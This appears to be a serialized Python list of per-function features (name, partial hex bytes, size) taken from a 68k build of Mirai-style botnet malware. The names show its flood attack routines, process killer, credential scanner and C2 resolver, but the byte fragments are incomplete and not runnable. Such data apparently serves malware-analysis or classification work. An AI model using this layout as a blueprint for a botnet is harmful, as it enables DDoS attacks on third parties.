(lp0
(S'_init'
p1
S'4e560061ff0061ff00'
p2
L20L
tp3
a(S'__do_global_dtors_aux'
p4
S'4e56004a392200dc514a885889c980dc2200dc514a8841f900004a88487900c0'
p5
L78L
tp6
a(S'call___do_global_dtors_aux'
p7
S'4e56004e5e4e'
p8
L8L
tp9
a(S'frame_dummy'
p10
S'4e560041f900004a884879003a80c0'
p11
L62L
tp12
a(S'call_frame_dummy'
p13
S'4e56004e5e4e'
p14
L8L
tp15
a(S'_start'
p16
S'9dce2020574851487900009448502f00808480ee'
p17
L38L
tp18
a(S'attack_app_http'
p19
S'4e56aea000af42'
p20
L5842L
tp21
a(S'attack_get_opt_str'
p22
S'48e700002f00162f0022148100891052816ee642204cdf1c'
p23
L60L
tp24
a(S'attack_get_opt_ip'
p25
S'2f0200a74280002f002f0080002f00'
p26
L60L
tp27
a(S'attack_get_opt_int'
p28
S'2f0200a74280002f002f0080002f00'
p29
L64L
tp30
a(S'attack_start'
p31
S'4e560048e720001800160045f980789272b274809272b2321212805222005442800061ff00004878090000619a8842802f0000802f00504e904fef0060da59b400dab26e60ca04ff4e5e4e'
p32
L160L
tp33
a(S'attack_parse'
p34
S'48e728306f000368008b01003c05012c0542'
p35
L384L
tp36
a(S'attack_kill_all'
p37
S'2f0a8058200e48780900005fc2429ae4ff00ee244e'
p38
L46L
tp39
a(S'add_attack'
p40
S'2f0a02007806487801007b241104af0042808052e52068805461ff002380541280524280211380524fef0024244e'
p41
L98L
tp42
a(S'attack_init'
p43
S'2f0a80fc42a745f980444e9248790034780148790048780248790038004e924fef00bc487803487900b078049248790048780580b478064e924fef00bc4878074e924879006c48780a4fef0070244e'
p44
L144L
tp45
a(S'attack_gre_eth'
p46
S'4e56'
p47
L1150L
tp48
a(S'attack_gre_ip'
p49
S'4fef'
p50
L1016L
tp51
a(S'attack_tcp_stomp'
p52
S'4e56'
p53
L1284L
tp54
a(S'attack_tcp_ack'
p55
S'4fefff48e72c0000002f42'
p56
L1084L
tp57
a(S'attack_tcp_syn'
p58
S'4fefff48e72c002f006f002d00780480002f000068a7487802030280b6921f40003c00ff002f03023f4000ef00bc48780403021f40007801004e921f4000ef00bc4878062f03023f400000'
p59
L1100L
tp60
a(S'attack_udp_plain'
p61
S'4e56'
p62
L452L
tp63
a(S'attack_udp_generic'
p64
S'4fef'
p65
L824L
tp66
a(S'attack_udp_vse'
p67
S'4e56'
p68
L762L
tp69
a(S'attack_udp_dns'
p70
S'4e56f700d0140048780480f72f00005c9008487802030280b6921d3c00ff002f03023def00bc48780403021da74878054e921def00bc4878062f03023d78352f03023def00bc48780903023d780ca72f03021c4fef00974878080302'
p71
L1178L
tp72
a(S'checksum_generic'
p73
S'2f026f002200'
p74
L70L
tp75
a(S'checksum_tcpudp'
p76
S'48e7006f002f003a002018002910600830d8b06d064280d8484002d04842d402d000d44281'
p77
L134L
tp78
a(S'mem_exists'
p79
S'2f0a026f002f0024006f00b06d428118048104015288ff4240538024244e'
p80
L70L
tp81
a(S'killer_kill'
p82
S'48780939ff000650'
p83
L20L
tp84
a(S'killer_kill_by_port'
p85
S'4e56dd48e73c00487800486eeddf808c487800486edd4e92487801486efddf4fef00bc42a7486eff4e9245eeff2f0a003f0261ff00c40a0033ef00026effff1de3ff1de07c30e1780645f980ae4e924878074e9248780942a748790000c40000fff842807a80df3000000c00ec548024600212080c004229fddf09fddf0a00322f000a003510b2009a420438000c002002015289b00e0c0020e014014202745288b06d1041f620e00210ba4a044241f1e90210080c004219fddfe90a003258'
p86
L1094L
tp87
a(S'killer_init'
p88
S'4e56dfe73ca761ff00d400003500106e0080a87c02dcff48781747f980ee4e933dde4878010045f980c8000070b02000486e'
p89
L1500L
tp90
a(S'anti_gdb_entry'
p91
S'2380ba4e'
p92
L12L
tp93
a(S'teardown_connection'
p94
S'2080e4ff00002f10702380e478010058184e'
p95
L44L
tp96
a(S'ensure_single_instance'
p97
S'4e56'
p98
L316L
tp99
a(S'main'
p100
S'4e56f9d83c2a00452f100032'
p101
L1846L
tp102
a(S'resolve_cnc_addr'
p103
S'48e748780380ae4e9642a748780380122f0800020049f9809c4e944fef008b240061ff00404281011c80180b00014878049642a748780495338016487804944fef00df'
p104
L130L
tp105
a(S'rand_next'
p106
S'2f03023901a88080'
p107
L76L
tp108
a(S'rand_str'
p109
S'2f0a02002f00602c03'
p110
L68L
tp111
a(S'rand_alphastr'
p112
S'4e56'
p113
L128L
tp114
a(S'rand_init'
p115
S'2f0261ff00c2807eff00ff00c2e361ff00008639818a244e'
p116
L70L
tp117
a(S'resolv_skip_name'
p118
S'2f0a026f002f00221401800c'
p119
L88L
tp120
a(S'resolv_entries_free'
p121
S'2f0a004a8a20000a0000440c'
p122
L40L
tp123
a(S'resolv_domain_to_hostname'
p124
S'48e7300024000a001e7442528842420260241200040116'
p125
L82L
tp126
a(S'resolv_lookup'
p127
S'4e56ef5c48e73c780648780100416e08f7eb0c48ef5c2f002f08'
p128
L756L
tp129
a(S'consume_any_prompt'
p130
S'2004281653801a120c0018011201240c01230c0072b20c0853886ece42'
p131
L70L
tp132
a(S'can_consume'
p133
S'22042f00d000d100b152c0'
p134
L30L
tp135
a(S'scanner_kill'
p136
S'48780939ff00224e'
p137
L20L
tp138
a(S'deobf'
p139
S'48e72000240002001a68003d122f000208001a4fef0043600e100a'
p140
L92L
tp141
a(S'add_auth_entry'
p142
S'594f48e7302f0020808e008980002f39ff00d8c8bae322e98000'
p143
L240L
tp144
a(S'setup_connection'
p145
S'4fefff48e7386f0049ef0078102f0cff00542000ef00ff00001eee588f4878010061ff00684fef00ffab004878000061ff0072a74878032b04f980a0082f00002b04923f7c022c6b003f6b00277900c070274000ef00bc2f0c2b04ff004fef00df4fef004e'
p146
L204L
tp147
a(S'recv_strip_null'
p148
S'2f0a002f002f000a2f00ff00106e16601818061500b00660ec4281'
p149
L64L
tp150
a(S'scanner_init'
p151
S'4e56f8dc3f3cff004423802c00c880c000ce238008'
p152
L5096L
tp153
a(S'table_retrieve_val'
p154
S'22006f0020e7d2d180348942800080204e'
p155
L42L
tp156
a(S'toggle_obf'
p157
S'48e700100022e7d0d380343900008c0048432472e2420120d1d1d1d18000814e'
p158
L96L
tp159
a(S'table_lock_val'
p160
S'4280002f00'
p161
L18L
tp162
a(S'table_unlock_val'
p163
S'4280002f00'
p164
L18L
tp165
a(S'add_entry'
p166
S'48e7002f0042'
p167
L70L
tp168
a(S'table_init'
p169
S'2f0a004879000380c0780280a94e9248781db9124fef00bc48790013487848000248781db90500bc487900064e92487805b9074e9248780b8000004e924fef00bc487900094878074879000a4878088019004e924fef00bc4879000c9248780a803000004879000e4e924fef00bc4879004e4879001048780b807178114fef00bc48790014924878074879001500487900164e924fef00bc487900174e92487813809848781848781880ac4878194fef00bc4879001a48781080cf48781b4878164879001c924fef00bc4879001d004879001e4e9248780c79001f4e924fef00bc487900204878534879002148782080984878224fef00bc4879002348780c7900249248780980f74fef00bc4879004e9248780c79004e924878108019004e924fef00bc4879004e924878088048782a48780b8038004e924fef00bc4879004e92487812805448782d004879004e924fef00bc4879004e9248786f4879004e9248786e487900314fef00bc487900324878757900334fef00244e'
p170
L912L
tp171
a(S'util_strlen'
p172
S'20048080004e'
p173
L18L
tp174
a(S'util_memcpy'
p175
S'20006f006f006002d8'
p176
L28L
tp177
a(S'util_strcpy'
p178
S'2f026f00'
p179
L46L
tp180
a(S'util_zero'
p181
S'200020040251c8405380'
p182
L24L
tp183
a(S'util_itoa'
p184
S'4e56'
p185
L150L
tp186
a(S'util_memsearch'
p187
S'48e7306f0022146f00201cc8801808b4180ab106528081704cdf4e'
p188
L66L
tp189
a(S'util_atoi'
p190
S'48e7206f002c001949c200f40c00ee0c00e81449c28000601000009a0070244283020200d0006230d160200200bf6237600c019f0c00627020c01804c80300008860021449c24a843c00002483854483012d60005420'
p191
L234L
tp192
a(S'util_fdgets'
p193
S'48e7202f002f002a0004837801020506444fef000183120a4a83c0204cdf4e'
p194
L78L
tp195
a(S'util_local_addr'
p196
S'4e56'
p197
L134L
tp198
a(S'util_stristr'
p199
S'48e7202f002400428452844800201c4542831932000200bf620260100600bf620160b20c8391c542838830204cdf4e'
p200
L108L
tp201
a(S'util_strcmp'
p202
S'22046f00428118f842808000b01a12b2125288ff424053804e75'
p203
L66L
tp204
a(S'util_strncmp'
p205
S'2f026f00200c2f0042'
p206
L78L
tp207
a(S'fcntl'
p208
S'4e56ff2f0302002dff2058802d0cae0010b20008b0001c'
p209
L188L
tp210
a(S'__syscall_fcntl64'
p211
S'4e56'
p212
L88L
tp213
a(S'fcntl64'
p214
S'4e56'
p215
L54L
tp216
a(S'__syscall_chdir'
p217
S'4e56'
p218
L62L
tp219
a(S'chdir'
p220
S'4e56002f0061b84e'
p221
L16L
tp222
a(S'close'
p223
S'4e56'
p224
L60L
tp225
a(S'fork'
p226
S'4e56'
p227
L56L
tp228
a(S'getpid'
p229
S'4e56'
p230
L56L
tp231
a(S'getppid'
p232
S'4e56'
p233
L56L
tp234
a(S'ioctl'
p235
S'4e56ff48e700002dff2058802d00fc2d6e'
p236
L130L
tp237
a(S'__syscall_kill'
p238
S'4e56'
p239
L72L
tp240
a(S'kill'
p241
S'4e56002f000061aa50'
p242
L20L
tp243
a(S'__syscall_open'
p244
S'4e56ff48e700003d6e004284ff200c0408094e402d'
p245
L94L
tp246
a(S'open'
p247
S'4e56'
p248
L80L
tp249
a(S'creat'
p250
S'4e56002f0078412f0061'
p251
L30L
tp252
a(S'prctl'
p253
S'4e56'
p254
L98L
tp255
a(S'read'
p256
S'4e56'
p257
L84L
tp258
a(S'readlink'
p259
S'4e56'
p260
L84L
tp261
a(S'select'
p262
S'4e56'
p263
L100L
tp264
a(S'setsid'
p265
S'4e56'
p266
L56L
tp267
a(S'sigprocmask'
p268
S'4e56ff48e730001c0072b21200047020ff6068'
p269
L160L
tp270
a(S'time'
p271
S'4e56'
p272
L62L
tp273
a(S'unlink'
p274
S'4e56'
p275
L62L
tp276
a(S'write'
p277
S'4e56'
p278
L84L
tp279
a(S'closedir'
p280
S'4e56'
p281
L198L
tp282
a(S'opendir'
p283
S'4e56ff0061'
p284
L350L
tp285
a(S'readdir'
p286
S'4e56ff4aae001200017020600000d0802f0001'
p287
L292L
tp288
a(S'__errno_location'
p289
S'4e56002000f8205e4e'
p290
L16L
tp291
a(S'clock'
p292
S'4e56'
p293
L76L
tp294
a(S'_wordcopy_fwd_aligned'
p295
S'4e56ff70c0f470b0ff0038ffd0'
p296
L566L
tp297
a(S'_wordcopy_fwd_dest_aligned'
p298
S'4e56ff2f02000381f820'
p299
L500L
tp300
a(S'memcpy'
p301
S'4e56'
p302
L240L
tp303
a(S'_wordcopy_bwd_aligned'
p304
S'4e56ff42ae'
p305
L638L
tp306
a(S'_wordcopy_bwd_dest_aligned'
p307
S'4e56ff2f02'
p308
L578L
tp309
a(S'memmove'
p310
S'4e56'
p311
L288L
tp312
a(S'memset'
p313
S'4e56ff2df470b000001400000080002d'
p314
L310L
tp315
a(S'strcpy'
p316
S'4e56ff2f02f4200022ff908141'
p317
L92L
tp318
a(S'inet_addr'
p319
S'4e56'
p320
L48L
tp321
a(S'accept'
p322
S'4e56ff20002d00002deeff2f08001850'
p323
L50L
tp324
a(S'bind'
p325
S'4e56ff20002d006e00'
p326
L48L
tp327
a(S'connect'
p328
S'4e56ff20002d006e00'
p329
L48L
tp330
a(S'getsockname'
p331
S'4e56ff20002d00002deeff2f080061ff002c'
p332
L50L
tp333
a(S'getsockopt'
p334
S'4e56'
p335
L66L
tp336
a(S'listen'
p337
S'4e56'
p338
L42L
tp339
a(S'recv'
p340
S'4e56ff20002d006e00'
p341
L56L
tp342
a(S'recvfrom'
p343
S'4e56'
p344
L72L
tp345
a(S'send'
p346
S'4e56ff20002d006e00'
p347
L56L
tp348
a(S'sendto'
p349
S'4e56'
p350
L70L
tp351
a(S'setsockopt'
p352
S'4e56'
p353
L64L
tp354
a(S'socket'
p355
S'4e56ff20002d00002deeff2f080061ff004850'
p356
L50L
tp357
a(S'raise'
p358
S'4e560061'
p359
L28L
tp360
a(S'sigaddset'
p361
S'4e56'
p362
L70L
tp363
a(S'sigemptyset'
p364
S'4e56'
p365
L60L
tp366
a(S'signal'
p367
S'4e56'
p368
L238L
tp369
a(S'__sigismember'
p370
S'4e56ff20008080a840'
p371
L80L
tp372
a(S'__sigaddset'
p373
S'4e56'
p374
L68L
tp375
a(S'__sigdelset'
p376
S'4e56'
p377
L72L
tp378
a(S'__malloc_from_heap'
p379
S'4e56'
p380
L466L
tp381
a(S'malloc'
p382
S'4e56'
p383
L168L
tp384
a(S'calloc'
p385
S'4e56ff200008002dae0022'
p386
L118L
tp387
a(S'__heap_delete'
p388
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p389
L88L
tp390
a(S'__free_to_heap'
p391
S'4e56'
p392
L342L
tp393
a(S'free'
p394
S'4e5600487900c480f42f006100944fef005e4e'
p395
L32L
tp396
a(S'realloc'
p397
S'4e56'
p398
L408L
tp399
a(S'__heap_delete_0'
p400
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p401
L88L
tp402
a(S'__heap_free_area_alloc'
p403
S'4e56'
p404
L66L
tp405
a(S'__heap_alloc'
p406
S'4e56ff2f026e00ae'
p407
L150L
tp408
a(S'__heap_delete_1'
p409
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p410
L88L
tp411
a(S'__heap_free_area_alloc_0'
p412
S'4e56'
p413
L66L
tp414
a(S'__heap_alloc_at'
p415
S'4e56ff2f02'
p416
L144L
tp417
a(S'__heap_link_free_area'
p418
S'4e5600200c6e00046e006e00004aae000c6e00210c04086e0020000a6e006e00084e'
p419
L70L
tp420
a(S'__heap_link_free_area_after'
p421
S'4e56004aae000c6e00210c04086e0020006e00004e5e4e'
p422
L44L
tp423
a(S'__heap_add_free_area'
p424
S'4e56'
p425
L66L
tp426
a(S'__heap_free'
p427
S'4e56'
p428
L404L
tp429
a(S'atol'
p430
S'4e560048780a2f0061ff000cef005e4e'
p431
L28L
tp432
a(S'strtol'
p433
S'4e5600487801002f000061ff000e4fef004e5e4e'
p434
L34L
tp435
a(S'_stdlib_strto_l'
p436
S'4e56'
p437
L562L
tp438
a(S'exit'
p439
S'4e56ff2000e22f00ff2f0800034fef007900fc61ff00ec58'
p440
L122L
tp441
a(S'sleep'
p442
S'4e56fe20002daeff4aae0008fe0220eeff48ff600c'
p443
L558L
tp444
a(S'__uClibc_fini'
p445
S'4e56'
p446
L106L
tp447
a(S'__pthread_return_0'
p448
S'4e56004280'
p449
L10L
tp450
a(S'_pthread_cleanup_push_defer'
p451
S'4e56004e5e4e'
p452
L8L
tp453
a(S'__check_suid'
p454
S'4e56'
p455
L92L
tp456
a(S'__check_one_fd'
p457
S'4e56'
p458
L68L
tp459
a(S'__uClibc_init'
p460
S'4e56002080f44a80398080f423001080e8004a80'
p461
L74L
tp462
a(S'__uClibc_main'
p463
S'4e56ff230080e0ee00002000102380e46e00222080e481e5d080e47878a7200680ff00'
p464
L582L
tp465
a(S'__socketcall'
p466
S'4e56'
p467
L74L
tp468
a(S'__syscall_exit'
p469
S'4e56'
p470
L56L
tp471
a(S'_exit'
p472
S'4e56002f0061be'
p473
L14L
tp474
a(S'__syscall_fstat'
p475
S'4e56'
p476
L74L
tp477
a(S'fstat'
p478
S'4e56'
p479
L54L
tp480
a(S'__getdents'
p481
S'4e56ff2f002f000061ff005e4fef00ae'
p482
L278L
tp483
a(S'__syscall_getdents64'
p484
S'4e56'
p485
L88L
tp486
a(S'__getdents64'
p487
S'4e56ff2f02'
p488
L548L
tp489
a(S'getegid'
p490
S'4e56'
p491
L60L
tp492
a(S'geteuid'
p493
S'4e56'
p494
L60L
tp495
a(S'getgid'
p496
S'4e56'
p497
L60L
tp498
a(S'getuid'
p499
S'4e56'
p500
L60L
tp501
a(S'__syscall_llseek'
p502
S'4e56'
p503
L98L
tp504
a(S'lseek64'
p505
S'4e56'
p506
L108L
tp507
a(S'nanosleep'
p508
S'4e56'
p509
L78L
tp510
a(S'sbrk'
p511
S'4e56'
p512
L106L
tp513
a(S'times'
p514
S'4e56'
p515
L62L
tp516
a(S'__xstat64_conv'
p517
S'4e56'
p518
L336L
tp519
a(S'__xstat_conv'
p520
S'4e56ff48785442a72f00'
p521
L316L
tp522
a(S'inet_aton'
p523
S'4e56'
p524
L362L
tp525
a(S'sigaction'
p526
S'4e56'
p527
L232L
tp528
a(S'_dl_aux_init'
p529
S'4e560030d1002000c000d1002000c04e'
p530
L44L
tp531
a(S'brk'
p532
S'4e56'
p533
L64L
tp534
a(S'__syscall_rt_sigaction'
p535
S'4e56'
p536
L94L
tp537
a(S'ntohl'
p538
S'4e560020004e5e4e'
p539
L12L
tp540
a(S'ntohs'
p541
S'4e56'
p542
L22L
tp543
a(S'htonl'
p544
S'4e560020004e5e4e'
p545
L12L
tp546
a(S'htons'
p547
S'4e56'
p548
L22L
tp549
a(S'__do_global_ctors_aux'
p550
S'4e56002f0a80c47900c4b00a20ff6e'
p551
L42L
tp552
a(S'call___do_global_ctors_aux'
p553
S'4e56004e5e4e'
p554
L8L
tp555
a(S'_fini'
p556
S'4e560061'
p557
L14L
tp558
a.